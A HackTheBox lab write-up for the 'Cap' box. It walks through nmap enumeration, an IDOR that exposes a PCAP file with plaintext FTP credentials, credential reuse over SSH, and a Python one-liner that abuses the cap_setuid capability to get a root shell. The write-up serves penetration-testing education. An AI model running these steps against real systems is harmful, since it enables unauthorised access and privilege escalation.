---
layout: writeup
title: Cap
platform: HackTheBox
difficulty: Easy
box_icon: /assets/writeups/icons/Cap.png
date: 2025-10-25
tags:
  - idor
  - pcap-analysis
  - capabilities
  - python
  - ftp
os: Linux
ip: 10.129.x.x
---
<link rel="stylesheet" href="{{ '/assets/css/obsidian-dividers.css' | relative_url }}">

## Summary

<div class="divider divider-info">
    <span class="divider-title">TL;DR</span>
    <span class="divider-content">Cap is an Easy Linux box that demonstrates how Insecure Direct Object References (IDOR) can lead to credential leakage via PCAP files. Privilege escalation involves exploiting misconfigured Linux Capabilities on the Python binary to escalate to root.</span>
</div>

**Key Vulnerabilities:**
- IDOR in network capture download functionality
- Cleartext credentials in PCAP file
- Misconfigured Capabilities (`cap_setuid`) on Python binary

---

## Enumeration

### Nmap Scan

**Initial scan:**
```bash
nmap -vv -T5 -p- 10.129.x.x

nmap -vv -T5 -p21,22,80 -sC -sV 10.129.x.x
```

**Results:**
```bash
# Nmap 7.94 scan initiated Sat Oct 25 16:50:00 2025 as: nmap -vv -T5 -p21,22,80 -sC -sV 10.129.x.x
Nmap scan report for 10.129.x.x
Host is up (0.045s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

| Port | Service | TCP/UDP |
| ---- | ------- | ------- |
| 21   | FTP     | TCP     |
| 22   | SSH     | TCP     |
| 80   | HTTP    | TCP     |

**Key findings:**
- FTP open (vsftpd 3.0.3)
- SSH open (OpenSSH 8.2p1)
- HTTP server running Gunicorn (Python-based WSGI server)

---

### FTP Enumeration

Checked for anonymous access, but it was disabled. Credentials are required.

```bash
❯ ftp 10.129.x.x
Connected to 10.129.x.x.
220 (vsFTPd 3.0.3)
Name (10.129.x.x:user): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> quit
221 Goodbye.
```

---

### Web Enumeration

**Step 1:** Exploration

The web application is a dashboard for data monitoring. It includes a "Security Snapshot" feature (`/data/1`) that allows downloading a PCAP capture of network traffic.

**Step 2:** IDOR Discovery

Inspecting the URL structure reveals a potential IDOR vulnerability.

- `http://10.129.x.x/data/1` -> Contains 626 packets
- `http://10.129.x.x/data/2` -> Contains 0 packets

![Pasted image 20251025170054.png](/assets/images/2025-10-25-Cap/Pasted image 20251025170054.png)

![Pasted image 20251025170134.png](/assets/images/2025-10-25-Cap/Pasted image 20251025170134.png)

Testing `http://10.129.x.x/data/0` reveals a different dataset with capture data.

![Pasted image 20251025170206.png](/assets/images/2025-10-25-Cap/Pasted image 20251025170206.png)

<div class="divider divider-warning">
    <span class="divider-title">IDOR Vulnerability</span>
    <span class="divider-content">Insecure Direct Object References occur when an application provides direct access to objects based on user-supplied input. By modifying the ID from 1 to 0, we can access historical capture data that wasn't intended to be public.</span>
</div>

**Step 3:** PCAP Analysis

Downloaded the PCAP file from ID 0. Analyzing it in Wireshark reveals plaintext FTP credentials.

![Pasted image 20251025170239.png](/assets/images/2025-10-25-Cap/Pasted image 20251025170239.png)

```text
User: nathan
Pass: buckhead
```

---

## Initial Foothold

### FTP & SSH Access

**Step 1:** FTP Login

Logged in via FTP using the found credentials.

![Pasted image 20251025170318.png](/assets/images/2025-10-25-Cap/Pasted image 20251025170318.png)

Found the user flag in `user.txt`.

**Step 2:** SSH Login

Since credentials are often reused, I tried logging into SSH with the same credentials.

```bash
❯ ssh nathan@10.129.x.x
nathan@10.129.x.x's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Oct 25 17:03:12 UTC 2025

  System load:  0.0               Processes:             124
  Usage of /:   35.6% of 9.78GB   Users logged in:       0
  Memory usage: 22%               IPv4 address for eth0: 10.129.x.x
  Swap usage:   0%

0 updates can be applied immediately.

nathan@cap:~$ 
```

Successfully logged in as `nathan`.

---

## Privilege Escalation

### Capabilities Enumeration

**Step 1:** Checking Capabilities

Given the box name "Cap", I checked for Linux Capabilities.

```bash
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

![Pasted image 20251025170409.png](/assets/images/2025-10-25-Cap/Pasted image 20251025170409.png)

Found `cap_setuid` set on the Python binary:
`/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`

<div class="divider divider-info">
    <span class="divider-title">Linux Capabilities</span>
    <span class="divider-content">Capabilities divide root privileges into smaller, distinct units. The cap_setuid capability allows a process to manipulate its UID, effectively allowing it to become any user, including root, without using sudo.</span>
</div>

### Exploitation

**Step 2:** Escalate to Root

Exploited the capability using Python to set the UID to 0 (root) and spawn a shell.

```bash
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
root@cap:~#
```

![Pasted image 20251025170423.png](/assets/images/2025-10-25-Cap/Pasted image 20251025170423.png)

<div class="divider divider-root">
    <span class="divider-title">Root Access</span>
    <span class="divider-content">Successfully obtained root shell via Python capability abuse</span>
</div>

---

## Post-Exploitation

**Flags:**
- User: `/home/nathan/user.txt`
- Root: `/root/root.txt`

**Attack Chain Summary:**
1. IDOR vulnerability found in network capture download (`/data/0`)
2. Plaintext FTP credentials extracted from PCAP file
3. Credentials reused for SSH access as `nathan`
4. Enumeration reveals `cap_setuid` capability on Python binary
5. Python used to set UID to 0 and spawn root shell

**Key Lessons:**
- Numeric IDs in URLs should always be tested for IDOR
- Unencrypted protocols like FTP transmit credentials in cleartext
- Linux capabilities can be just as dangerous as SUID binaries if misconfigured
- Credential reuse across services (FTP -> SSH) is a common weakness

---

## References

- [Linux Capabilities - HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)
- [IDOR - OWASP](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [GTFOBins - Python Capabilities](https://gtfobins.github.io/gtfobins/python/#capabilities)

---

## Timeline

```mermaid
graph LR
    A[Nmap Scan] --> B[Web Enum]
    B --> C[IDOR Found]
    C --> D[PCAP Analysis]
    D --> E[FTP Creds]
    E --> F[SSH Access]
    F --> G[Getcap Enum]
    G --> H[Python Cap]
    H --> I[Root Shell]
```

---

**Pwned on:** 25/10/2025

**Difficulty Rating:** ⭐ (Very easy)  
**Fun Factor:** ⭐⭐ (Good intro to capabilities)
